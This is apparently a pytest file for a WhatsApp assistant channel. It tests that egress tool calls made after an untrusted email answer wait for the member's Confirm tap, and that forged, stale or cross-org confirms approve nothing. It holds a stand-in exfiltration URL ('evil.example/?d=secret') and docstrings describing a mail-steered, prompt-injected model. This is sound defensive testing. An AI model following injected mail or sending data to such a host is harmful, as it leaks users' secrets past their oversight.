"""WS-47 WAC-P4 — the Confirm of an egress call after an untrusted answer.

Spec: ``project-docs/specs/whatsapp_assistant_channel.md`` §17.3 and §17.5.

The defect (production, 2026-10-15 to 2026-10-19). After the email assistant
answered once, the thread carried the untrusted-answer mark (EM-G11d), and
each later egress call needed the member's card. WhatsApp shows no card, so
the call was refused (``permission.untrusted_answer_refused
outcome=no_card_channel``, 6 times in 4 days). The fix asks the same
question through the WAC-4 Confirm and Cancel buttons, where the gateway
records the member's tap.

The REAL webhook route, ``bot_run``, ``acts.settle``, the REAL injection
seam wrapper (``_tool_injection._gate_injected_tool``), the REAL permission
policy and the REAL mark reader (``acb_skills.egress``) run here. The fakes
are those of ``test_wac_writes.py``: the act table in memory with row level
security, the Meta provider, and the mark store of ``tests/conftest.py``.

R7 fences named here:

* ``wacp4-park-then-confirm``: the call parks, reaches nothing, and ONE
  Confirm lets exactly that call run once.
* ``wacp4-forged``: no Confirm buttons, a typed Confirm with no act, a call
  with other arguments, and a yes outside a WhatsApp run approve nothing.
* ``wacp4-bound``: another phone, another org, a stale tap and an expired act
  approve nothing.
* ``wacp4-room``: a room settles no act.
* ``wacp4-batch-refuses``: a run with no member and no channel still refuses.
* ``wacp4-mark-replay``: a WhatsApp mark ends when its turn left the replay,
  and only in the WhatsApp run of that thread.
"""
from __future__ import annotations

import time
from typing import Any

import orchestrator._tool_injection as ti
import pytest
from acb_common.db import bind_tenant, release_tenant
from acb_skills import egress
from acb_skills import whatsapp_acts as wacts
from acb_skills import whatsapp_ui as wui
from acb_skills.write_artifact import artifact_context_scope, bind_artifact_context
from gateway.routes.whatsapp_channel import acts, bot_run

from tests.unit.test_wac_bot_run import (  # noqa: F401 - `world` is a fixture
    MEMBER,
    ORG_A,
    ORG_B,
    _message,
    _post_and_run,
    world,
)
from tests.unit.test_wac_writes import (  # noqa: F401 - `env` is a fixture
    PHONE_2,
    _Env,
    _switches,
    _tap,
    _texts,
    env,
)

URL = "https://example.com/quote"
EVIL = "https://evil.example/?d=secret"
ASK = "Open the link in that mail"
READY = "It waits for your Confirm."

#: Each call that reached the egress tool, in order.
REACHED: list[dict[str, Any]] = []


async def fetch_page(url: str) -> str:
    """Fetch one web page. An egress tool: it reaches outside Metorite."""
    REACHED.append({"url": url})
    return f"The page at {url}."


@pytest.fixture(autouse=True)
def _reached() -> None:
    REACHED.clear()
    yield
    REACHED.clear()


class _EgressAgent:
    """``run_agent`` that calls the REAL gated egress tool, as a run does.

    Each run binds the artifact context the executor binds (the thread, the
    member). With *mark*, the run first marks its thread, as the email
    assistant's answer does. Each script entry is the arguments of one call,
    a list of them, or None for no call."""

    def __init__(self, *script: Any, mark: bool = True) -> None:
        self.script = list(script)
        self.mark = mark
        self.tool = ti._gate_injected_tool(fetch_page)
        self.seen: list[dict[str, Any]] = []
        self.outputs: list[str] = []

    async def __call__(self, agent: str, payload: dict[str, Any], **kw: Any) -> Any:
        self.seen.append({"payload": payload, "run": wui.current_run()})
        entry = self.script.pop(0) if self.script else None
        calls = entry if isinstance(entry, list) else [entry] if entry else []
        with artifact_context_scope():
            bind_artifact_context(session_id=kw["thread_id"], agent_name="orchestrator",
                                  run_id=kw["run_id"], member=kw["session_user"])
            if self.mark:
                assert await egress.mark_untrusted_answer()
            for args in calls:
                self.outputs.append(str(await self.tool(**args)))
        return {"result": READY}


async def _ask(env: _Env, args: dict[str, Any] | None = None) -> None:
    env.world.agent = _EgressAgent(dict(args or {"url": URL}))
    await _post_and_run(_message(ASK))


def _act(env: _Env) -> dict[str, Any]:
    (row,) = [r for r in env.acts.rows.values()
              if wacts.is_egress_act(r["tool_name"])]
    return row


# ── The ask parks the call ──────────────────────────────────────────────────


async def test_a_marked_egress_call_parks_and_reaches_nothing(env: _Env) -> None:
    await _ask(env)

    assert REACHED == [], "the call reached outside before the Confirm"
    assert env.world.agent.outputs == [wacts.EGRESS_PARKED_TEXT]
    row = _act(env)
    assert row["state"] == "pending" and row["org"] == ORG_A
    assert row["member_email"] == MEMBER
    assert row["tool_name"] == "egress__fetch_page"
    assert row["arguments"] == {"url": URL}
    assert row["card_text"] == wacts.egress_card_text("fetch_page", {"url": URL})
    assert env.prov.buttons == [["Confirm", "Cancel"]]
    summary = next(t for t in _texts(env) if t.startswith("*Run fetch_page?"))
    assert URL in summary and "email assistant" in summary


async def test_one_confirm_runs_exactly_the_confirmed_call_once(env: _Env) -> None:
    await _ask(env)
    env.world.agent.script.append({"url": URL})
    await _post_and_run(_tap("Confirm", of=env.prov.button_wamids[-1]))

    assert REACHED == [{"url": URL}]
    assert _act(env)["state"] == "done"
    turn = env.world.agent.seen[-1]["payload"]["message"]
    assert turn.startswith("Confirm") and "tapped Confirm" in turn and URL in turn
    # The yes ended with the run.
    assert wacts._APPROVING.get() is None

    # A second Confirm, or the same tap again, finds no act and runs nothing.
    env.world.agent.script.append({"url": URL})
    await _post_and_run(_message("Confirm"))
    assert REACHED == [{"url": URL}], "a second Confirm ran the call again"


async def test_cancel_closes_the_act_and_nothing_reaches_out(env: _Env) -> None:
    await _ask(env)
    await _post_and_run(_tap("Cancel"))

    assert REACHED == []
    assert _act(env)["state"] == "cancelled"
    assert _texts(env)[-1] == acts.REPLY_CANCELLED


# ── wacp4-forged ────────────────────────────────────────────────────────────


async def test_a_typed_confirm_with_no_act_approves_nothing(env: _Env) -> None:
    """The member's "Confirm" names no call. With no act, the run is a
    normal run, and its egress call parks again."""
    env.world.agent = _EgressAgent({"url": URL})
    await _post_and_run(_message("Confirm"))

    assert REACHED == []
    assert env.world.agent.outputs == [wacts.EGRESS_PARKED_TEXT]
    assert _act(env)["state"] == "pending"


async def test_a_call_with_other_arguments_at_confirm_is_not_approved(env: _Env) -> None:
    """A mail could steer the run that the Confirm starts. The yes binds the
    tool AND every argument, so another URL parks as a new act and shows
    the member its own summary."""
    await _ask(env)
    env.world.agent.script.append({"url": EVIL})
    await _post_and_run(_tap("Confirm", of=env.prov.button_wamids[-1]))

    assert REACHED == [], "a call the member never saw was approved"
    states = sorted((r["arguments"]["url"], r["state"], r["code"])
                    for r in env.acts.rows.values())
    assert states == [(EVIL, "pending", None), (URL, "void", "unused")]
    assert len(env.prov.buttons) == 2


async def test_the_yes_lets_one_call_run_and_no_second(env: _Env) -> None:
    await _ask(env)
    env.world.agent.script.append([{"url": URL}, {"url": URL}])
    await _post_and_run(_tap("Confirm", of=env.prov.button_wamids[-1]))

    assert REACHED == [{"url": URL}]
    assert env.world.agent.outputs[-1] == wacts.EGRESS_PARKED_TEXT


async def test_a_yes_never_reaches_a_run_with_no_whatsapp_profile() -> None:
    card = wacts.egress_card_text("fetch_page", {"url": URL})
    with wacts.approving(card):
        assert wacts.answer_egress("fetch_page", {"url": URL}) is None
    with wui.whatsapp_run("orchestrator", writes=True):
        # The yes closed with its scope: a task that outlived it gets none.
        assert wacts.answer_egress("fetch_page", {"url": URL}) == wacts.EGRESS_PARKED


async def test_a_yes_that_closed_approves_nothing() -> None:
    card = wacts.egress_card_text("fetch_page", {"url": URL})
    with wui.whatsapp_run("orchestrator", writes=False):
        with wacts.approving(card) as yes:
            pass
        assert yes.closed and not yes.used
        token = wacts._APPROVING.set(yes)
        try:
            assert wacts.answer_egress("fetch_page", {"url": URL}) is None
        finally:
            wacts._APPROVING.reset(token)


async def test_the_model_cannot_offer_the_confirm_buttons() -> None:
    """Only code offers Confirm (WAC-4 W6), so a model that a mail steers
    cannot build a button that looks like the member's yes."""
    with wui.whatsapp_run("orchestrator", writes=True) as run:
        out = await wui.whatsapp_ui("buttons", {"body": "Go?", "buttons": ["Confirm", "No"]})
    assert out["ok"] is False and run.outbox == []


# ── wacp4-bound ─────────────────────────────────────────────────────────────


async def test_a_confirm_from_another_phone_approves_nothing(env: _Env) -> None:
    await _ask(env)
    env.world.agent.script.append({"url": URL})
    await _post_and_run(_message("Confirm", sender=PHONE_2))

    assert REACHED == []
    # The other phone's "Confirm" ran as a normal message, and its own call
    # parked for ITS buttons. The first phone's act is untouched.
    other = [r["state"] for r in env.acts.rows.values() if r["wa_id"] == PHONE_2]
    assert other == ["pending"]
    first = [r for r in env.acts.rows.values() if r["wa_id"] != PHONE_2]
    assert [r["state"] for r in first] == ["pending"], "another phone touched the act"


async def test_a_confirm_after_an_org_switch_approves_nothing(env: _Env) -> None:
    """Org B never sees org A's act (row level security), so the Confirm is
    a normal message of org B, and its call parks there."""
    await _ask(env)
    env.world.links = [
        {"organization_id": ORG_A, "member_email": MEMBER, "is_current": False},
        {"organization_id": ORG_B, "member_email": MEMBER, "is_current": True},
    ]
    env.world.identity = ("uid-1", ORG_B)
    env.world.agent.script.append({"url": URL})
    await _post_and_run(_message("Confirm"))

    assert REACHED == []
    rows = {r["org"]: r["state"] for r in env.acts.rows.values()}
    assert rows == {ORG_A: "pending", ORG_B: "pending"}


async def test_a_tap_on_another_card_is_stale_and_approves_nothing(env: _Env) -> None:
    await _ask(env)
    env.world.agent.script.append({"url": URL})
    await _post_and_run(_tap("Confirm", of="wamid.an-older-card"))

    assert REACHED == []
    assert _act(env)["state"] == "pending"
    assert _texts(env)[-1] == acts.REPLY_STALE


async def test_a_confirm_after_10_minutes_approves_nothing(env: _Env) -> None:
    await _ask(env)
    env.acts.now += acts.ACT_TTL_S + 1
    env.world.agent.script.append({"url": URL})
    await _post_and_run(_tap("Confirm", of=env.prov.button_wamids[-1]))

    assert REACHED == []
    assert _act(env)["state"] == "expired"
    assert _texts(env)[-1] == acts.REPLY_EXPIRED


# ── wacp4-room ──────────────────────────────────────────────────────────────


async def test_a_confirm_in_a_thread_that_became_a_room_approves_nothing(
    env: _Env, monkeypatch: pytest.MonkeyPatch,
) -> None:
    await _ask(env)
    seen: list[str] = []

    async def _room(sid: str) -> bool:
        seen.append(sid)
        return len(seen) > 1

    monkeypatch.setattr(bot_run, "_thread_shared", _room)
    env.world.agent.script.append({"url": URL})
    first = _act(env)["id"]
    await _post_and_run(_tap("Confirm", of=env.prov.button_wamids[-1]))

    assert REACHED == []
    # No settle ran: the act was never claimed. (The room's own run parked a
    # new act, which replaced it.)
    assert env.acts.rows[first]["state"] in ("pending", "void")
    assert env.acts.rows[first]["code"] in (None, "replaced")
    # The room's answer is refused, so no new act ever reaches a phone.
    later = [r for r in env.acts.rows.values() if r["id"] != first]
    assert all(r["offered_seq"] is None for r in later)
    assert len(env.prov.buttons) == 1


# ── wacp4-batch-refuses, and the switch ─────────────────────────────────────


async def test_a_run_with_no_member_and_no_channel_still_refuses() -> None:
    tool = ti._gate_injected_tool(fetch_page)
    token = bind_tenant(ORG_A)
    try:
        with artifact_context_scope():
            bind_artifact_context(session_id="batch-thread", agent_name="orchestrator",
                                  run_id="r1", member="", batch_thread=True)
            assert await egress.mark_untrusted_answer()
            card = wacts.egress_card_text("fetch_page", {"url": URL})
            with wacts.approving(card):
                out = await tool(url=URL)
    finally:
        release_tenant(token)
    assert out == ti.UNTRUSTED_ANSWER_REFUSED.format(tool="fetch_page")
    assert REACHED == []


async def test_with_writes_off_the_call_is_refused_as_before(
    env: _Env, monkeypatch: pytest.MonkeyPatch,
) -> None:
    _switches(monkeypatch, native=True, writes=False)
    await _ask(env)

    assert REACHED == []
    assert env.world.agent.outputs == [ti.UNTRUSTED_ANSWER_REFUSED.format(tool="fetch_page")]
    assert env.acts.rows == {} and env.prov.buttons == []


# ── wacp4-mark-replay ───────────────────────────────────────────────────────

SESSION = "wa-thread-replay"


async def _mark_in(*, whatsapp: bool) -> int:
    """Mark SESSION of ORG_A, in a WhatsApp run or not. Returns the time."""
    before = int(time.time() * 1000)
    with artifact_context_scope():
        bind_artifact_context(session_id=SESSION, agent_name="orchestrator",
                              run_id="r0", member=MEMBER)
        if whatsapp:
            with wui.whatsapp_run("orchestrator", org=ORG_A, writes=True):
                assert await egress.mark_untrusted_answer()
        else:
            assert await egress.mark_untrusted_answer()
    return before


async def _state(*, horizon: int | None, session: str = SESSION,
                 whatsapp: bool = True) -> tuple[str, bool]:
    with artifact_context_scope():
        bind_artifact_context(session_id=SESSION, agent_name="orchestrator",
                              run_id="r1", member=MEMBER)
        if not whatsapp:
            return await egress.session_mark_state(), egress.read_untrusted_answer()
        with wui.whatsapp_run("orchestrator", org=ORG_A, writes=True,
                              replay_session=session, replay_clear_before_ms=horizon):
            return await egress.session_mark_state(), egress.read_untrusted_answer()


@pytest.fixture()
def bound() -> Any:
    token = bind_tenant(ORG_A)
    yield
    release_tenant(token)


LATER = 10**15  # a horizon after any mark of this test


async def test_a_whatsapp_mark_reads_clear_once_its_turn_left_the_replay(bound: Any) -> None:
    at = await _mark_in(whatsapp=True)
    assert await _state(horizon=None) == (egress.MARK_MARKED, True)
    assert await _state(horizon=at - 1) == (egress.MARK_MARKED, True)
    assert await _state(horizon=LATER) == (egress.MARK_CLEAR, False)
    # Redis decides, not the cache alone: an empty cache reads the same.
    egress._MARKED_SESSIONS.clear()
    assert (await _state(horizon=LATER))[0] == egress.MARK_CLEAR
    egress._MARKED_SESSIONS.clear()
    assert (await _state(horizon=at - 1))[0] == egress.MARK_MARKED


async def test_the_horizon_of_another_thread_or_no_whatsapp_run_clears_nothing(
    bound: Any,
) -> None:
    await _mark_in(whatsapp=True)
    assert (await _state(horizon=LATER, session="another-thread"))[0] == egress.MARK_MARKED
    assert (await _state(horizon=LATER, whatsapp=False))[0] == egress.MARK_MARKED


async def test_a_mark_that_another_run_set_never_ends_by_replay(bound: Any) -> None:
    """A web run's mark has no time. A later WhatsApp mark keeps it sticky."""
    await _mark_in(whatsapp=False)
    assert (await _state(horizon=LATER))[0] == egress.MARK_MARKED
    await _mark_in(whatsapp=True)
    egress._MARKED_SESSIONS.clear()
    assert (await _state(horizon=LATER))[0] == egress.MARK_MARKED


async def test_a_new_whatsapp_mark_in_the_replay_holds_again(bound: Any) -> None:
    first = await _mark_in(whatsapp=True)
    assert (await _state(horizon=first + 1))[0] == egress.MARK_CLEAR
    second = await _mark_in(whatsapp=True)
    assert (await _state(horizon=second - 1))[0] == egress.MARK_MARKED


async def test_after_the_replay_moved_on_the_call_runs_with_no_confirm(env: _Env) -> None:
    """End to end: the turn that marked the thread left the replay of a
    later run (``bot_run._replay_horizon``), so its call needs no Confirm."""
    env.world.agent = _EgressAgent(None)
    await _post_and_run(_message("Read my mail"))
    env.world.agent.mark = False
    env.world.agent.script.append({"url": URL})
    env.world.store.horizon = LATER
    await _post_and_run(_message(ASK))

    assert REACHED == [{"url": URL}]
    assert env.acts.rows == {}


def test_the_horizon_bound_covers_the_longest_run() -> None:
    """A mark comes before its run's reply by at most the run's time limit,
    so the horizon is the newest dropped row less more than that."""
    assert bot_run.MARK_TO_REPLY_MS > bot_run.RUN_TIMEOUT_S * 1000
